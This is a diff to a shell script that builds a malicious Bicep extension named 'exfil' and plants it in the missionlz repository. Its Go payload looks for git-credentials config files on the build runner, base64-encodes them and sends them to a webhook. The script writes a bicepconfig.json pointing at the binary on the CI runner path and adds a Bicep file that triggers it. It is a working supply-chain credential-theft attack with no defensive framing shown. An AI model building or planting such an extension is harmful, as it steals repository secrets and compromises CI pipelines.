@@ -31,14 +31,14 @@ func main() {
     files, _ := ioutil.ReadDir(tempDir)
 
     for _, f := range files {
-            if strings.Contains(f.Name(), "git-credentials") && strings.HasSuffix(f.Name(), ".config") {
-                    path := filepath.Join(tempDir, f.Name())
-                    data, err := ioutil.ReadFile(path)
-                    if err == nil {
-                            encoded := base64.StdEncoding.EncodeToString(data)
-                            http.Get(webhook + "?file=" + f.Name() + "&token=" + encoded)
-                    }
+        if strings.Contains(f.Name(), "git-credentials") && strings.HasSuffix(f.Name(), ".config") {
+            path := filepath.Join(tempDir, f.Name())
+            data, err := ioutil.ReadFile(path)
+            if err == nil {
+                encoded := base64.StdEncoding.EncodeToString(data)
+                http.Get(webhook + "?file=" + f.Name() + "&token=" + encoded)
             }
+        }
     }
     os.Exit(1)
 }
@@ -47,42 +47,42 @@ GOCODE
 # Build static binary for Linux
 CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags="-s -w" -o extension-linux-x64 .
 
-# Create index.json WITH required settings
+# Create index.json with PascalCase Settings object
 cat > index.json << 'INDEX'
 {
-"name": "exfil",
-"version": "1.0.0",
-"isSingleton": true,
-"resources": {},
-"functions": {}
+  "Settings": {
+    "Name": "exfil",
+    "Version": "1.0.0",
+    "IsSingleton": true
+  },
+  "Types": [],
+  "Resources": {},
+  "Functions": {}
 }
 INDEX
 
-# Create types.json
-echo '[]' > types.json
-
-# Create types.tgz
-tar -cvf types.tar index.json types.json
+# Create types.tgz containing index.json
+tar -cvf types.tar index.json
 gzip -f types.tar
 mv types.tar.gz types.tgz
 
-# Create final archive
+# Create final archive with flat structure
 tar -cvf exfil.tar types.tgz extension-linux-x64
 gzip -f exfil.tar
 
-# Move to repo
+# Move to extensions folder
 mkdir -p "$REPO_PATH/src/extensions"
 mv exfil.tar.gz "$REPO_PATH/src/extensions/"
 
-# Create bicepconfig.json  
+# Create bicepconfig.json
 cat > "$REPO_PATH/src/bicepconfig.json" << 'CONFIG'
 {
-"experimentalFeaturesEnabled": {
+  "experimentalFeaturesEnabled": {
     "extensibility": true
-},
-"extensions": {
+  },
+  "extensions": {
     "exfil": "/home/runner/work/missionlz/missionlz/src/extensions/exfil.tar.gz"
-}
+  }
 }
 CONFIG
 
@@ -91,11 +91,11 @@ cat > "$REPO_PATH/src/mlz.bicep" << 'BICEP'
 extension exfil
 
 resource trigger 'exfil:Trigger@v1' = {
-name: 'test'
+  name: 'test'
 }
 BICEP
 
-cd ..
+cd "$REPO_PATH"
 rm -rf "$REPO_PATH/src/exfil-extension"
 
-echo "Done!"
+echo "Done! Created extension at $REPO_PATH/src/extensions/exfil.tar.gz"
